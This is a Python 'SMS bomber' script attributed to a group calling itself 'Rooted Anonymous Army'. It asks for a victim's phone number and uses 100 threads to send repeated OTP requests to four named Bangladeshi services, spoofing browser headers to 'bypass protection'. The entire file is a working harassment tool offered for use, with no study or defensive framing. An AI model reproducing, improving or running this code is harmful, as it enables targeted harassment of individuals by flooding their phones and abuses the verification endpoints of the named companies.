import os, sys, time, requests, random
from concurrent.futures import ThreadPoolExecutor

# --- Color Toolkit ---
G = '\033[1;32m'; R = '\033[1;31m'; Y = '\033[1;33m'; C = '\033[1;36m'; W = '\033[1;37m'

def banner():
    os.system('clear')
    print(f"""{C}
    ____  ___    ___     ____  ____  ___ 
   / __ \/   |  /   |   / __ \/ __ \/   |
  / /_/ / /| | / /| |  / /_/ / /_/ / /| |
 / _, _/ ___ |/ ___ | / _, _/ _, _/ ___ |
/_/ |_/_/  |_/_/  |_|/_/ |_/_/ |_/_/  |_|
{R}   [ ROOTED ANONYMOUS ARMY - GOD MODE ]
{G}================================================
{G} [+] CREATED BY  : {W}Sabid Sarker
{G} [+] TEAM        : {R}RAA (Rooted Anonymous Army)
{G} [+] SYSTEM      : {Y}Multi-API Bomber v20.0
{G} [+] STATUS      : {C}Online / International
{G}================================================{W}""")

def fire(target, limit):
    # Modern Headers to bypass protection
    heads = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Referer': 'https://www.google.com/'
    }

    def attack(i):
        try:
            # API 1: Nagad (Requesting OTP)
            requests.post("https://api.nagad.com.bd:30000/api/v1/auth/login", json={"mobile": target}, headers=heads, timeout=5)
            # API 2: Foodpanda
            requests.post("https://www.foodpanda.com.bd/api/v1/login/otp", data={"phone": target}, headers=heads, timeout=5)
            # API 3: Shohoz
            requests.post("https://www.shohoz.com/api/v1/user/otp", json={"mobile": target}, headers=heads, timeout=5)
            # API 4: Bikroy
            requests.get(f"https://bikroy.com/data/phone_number_login/verifications/phones/{target}", headers=heads, timeout=5)
            
            print(f"\r{G}[✔] RAA-ATTACK SUCCESSFUL: {i+1}", end="")
        except:
            pass

    print(f"\n{Y}[*] Injecting Payload to: {target}{W}")
    print(f"{Y}[*] Status: Threading Started...{W}\n")
    
    with ThreadPoolExecutor(max_workers=100) as executor:
        for i in range(limit):
            executor.submit(attack, i)
    
    print(f"\n\n{G}[+] Mission Completed. Target Flooded.{W}")
    input(f"{C}Press Enter to return...{W}")

def main():
    while True:
        banner()
        print(f" {C}[01]{W} Start Heavy SMS Bomber")
        print(f" {C}[02]{W} International Call Bomb (Soon)")
        print(f" {C}[03]{W} Update Script")
        print(f" {C}[00]{W} Exit Shell")
        
        choice = input(f"\n{C}[RAA-Shell]:~# {W}")
        
        if choice in ['1', '01']:
            target = input(f"\n{G}[+] Target Number (01xxx): {W}")
            if len(target) == 10: target = "0" + target
            try:
                limit = int(input(f"{G}[+] Bombing Limit: {W}"))
                fire(target, limit)
            except: print(f"{R}[!] Invalid Input!{W}"); time.sleep(1)
            
        elif choice in ['3', '03']:
            print(f"{Y}[*] Checking for updates...{W}")
            os.system("git pull")
            print(f"{G}[✔] Script Updated!{W}"); time.sleep(2)
            
        elif choice in ['0', '00']:
            print(f"{R}[!] Logging out...{W}")
            sys.exit()

if __name__ == "__main__":
    main()
